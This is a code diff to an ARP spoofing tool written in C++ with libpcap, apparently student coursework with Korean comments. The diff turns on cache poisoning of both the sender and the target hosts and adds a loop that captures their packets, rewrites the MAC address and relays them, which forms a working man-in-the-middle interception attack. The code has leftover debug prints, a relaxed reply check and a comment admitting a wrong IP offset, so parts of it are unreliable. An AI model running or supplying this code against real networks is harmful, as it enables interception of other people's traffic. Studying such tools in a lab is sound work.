@@ -11,6 +11,7 @@
 #include <sys/socket.h>
 
 #include <map>
+using namespace std;
 struct EthArpPacket {
     EthHdr eth_;
     ArpHdr arp_;
@@ -44,9 +45,7 @@ void get_my_mac(char * interface, unsigned char * mac) {
         exit(EXIT_FAILURE);
     }
     memcpy(mac, (unsigned char *)req.ifr_hwaddr.sa_data, 6);
-    printf("my_mac:");
-    for(int i = 0 ; i <6; i++)
-        printf("%02X:", mac[i]);
+
     close(sock);
 }
 
@@ -102,7 +101,7 @@ void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, I
 
     make_arp_packet(&arp_packet, I->mac_, I->ip_, smac, sip, ArpHdr::Request);
     send_arp_packet(handle, &arp_packet);
-
+    printf("1...\n");
     while(true){
         struct pcap_pkthdr* header;
         const u_char* packet;
@@ -114,28 +113,55 @@ void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, I
         }
 
         EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;
-        if(arp_reply_packet->eth_.type() == EthHdr::Arp && arp_reply_packet->arp_.op() == ArpHdr::Reply) {
+
+        if(arp_reply_packet->eth_.type() == EthHdr::Arp){ // arp_reply_packet->arp_.op() == ArpHdr::Reply) {
             memcpy(&arp_packet, arp_reply_packet, sizeof(EthArpPacket));
             break;
         }
-
+        printf("2...\n");
     }
     sender->mac_ = arp_packet.eth_.smac_;
     sender->ip_ = arp_packet.arp_.sip();
-    //void make_arp_packet(EthArpPacket* buf, uint8_t smac[], uint32_t sip, uint8_t tmac[], uint32_t tip, int op){
+
     make_arp_packet(&arp_packet, I->mac_, target, sender->mac_, sender->ip_, ArpHdr::Reply);
     send_arp_packet(handle, &arp_packet);
-    // info update
+    printf("3...\n");
+}
 
+bool check_arp_packet(const u_char* packet){
+    uint16_t type;
+    memcpy(&type, (uint16_t*)(packet + 12), 2);
+    if(ntohs(type) == EthHdr::Arp){
+        return true;
+    }
+    return false;
+}
 
+void relay_packet(pcap_t * handle, const u_char* packet, ArpInfo I, bpf_u_int32 caplen){
+    printf("Packet Relay...\n");
+    memcpy((u_char *) (packet + 6), &(I.mac_), 6);
+    printf("%02X:%02X:%02X:%02X:%02X:%02X\n", packet[6], packet[7], packet[8], packet[9], packet[10], packet[11]);
+    int res = pcap_inject(handle, reinterpret_cast<const uint8_t *>(packet), caplen);
+    printf("packet inject: %d bytes\n", res);
+    if (res == 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
 
 }
+
+
 
 void update_arp_table(ArpInfo sender, ArpInfo target, ArpInfo attacker){ // reply 패킷만 보내는 용도!!
     //make_arp_packet();
     //send_arp_packet();
     //make_arp_packet();
     //send_arp_packet();
+}
+
+void print_ip(uint32_t ip){
+    uint8_t to[4];
+    memcpy(to, &ip, 4);
+    printf("%u.%u.%u.%u\n", to[0],to[1],to[2],to[3]);
 }
 
 
@@ -152,6 +178,7 @@ int main(int argc, char * argv[]) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
+    map<Ip,Mac> ArpTable;
 
     ArpInfo I;
     get_my_mac(argv[1], I.mac_);
@@ -168,30 +195,37 @@ int main(int argc, char * argv[]) {
     Ip temp2 = Ip(argv[5]);
 
     infect_arp_table(handle, &sender, &I, argv[2], temp1);
-    //infect_arp_table(handle, &target, &I, argv[4], temp2);
-    for(int i = 0 ; i <6; i++)
-        printf("%02x", sender.mac_[i]);
+    printf("where is...\n");
+    infect_arp_table(handle, &target, &I, argv[4], temp2);
+    printf("Infect Arp Table Success...\n");
 
-    printf("\n");
-    for(int i = 0 ; i <6; i++)
-        printf("%02x", target.mac_[i]);
+    while(true){
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
+        if (res == 0) continue;
+        if (res == -1 || res == -2) {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            break;
+        }
 
-//    while(true){
-//        struct pcap_pkthdr* header;
-//        const u_char* packet;
-//        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
-//        if (res == 0) continue;
-//        if (res == -1 || res == -2) {
-//            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-//            break;
-//        }
-//
-//        EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;
-//        if(ntohs(arp_reply_packet->eth_.type_) == EthHdr::Arp) {
-//            //update_arp_table
-//        }
-//
-//    }
+        if(check_arp_packet(packet)){
+            printf("Capture Arp Packet...\n");
+            //update_arp_table
+            continue;
+        }
+        uint32_t check_ip;
+
+        memcpy(&check_ip, (packet + 26), 4); //ip의 위치가 틀렸다!
+        //printf("Captured Packet IP:%s\n", inet_ntoa(check_ip));
+        printf("Packet IP: ");
+        print_ip(check_ip);
+        printf("Check Ip...\n");
+
+        if(htonl(check_ip) == sender.ip_ || htonl(check_ip) == target.ip_) // if ip is in arp_table
+            relay_packet(handle, packet, I, header->caplen); //센더 mac만 바꿔주면 된다.
+
+    }
 
 
     pcap_close(handle);
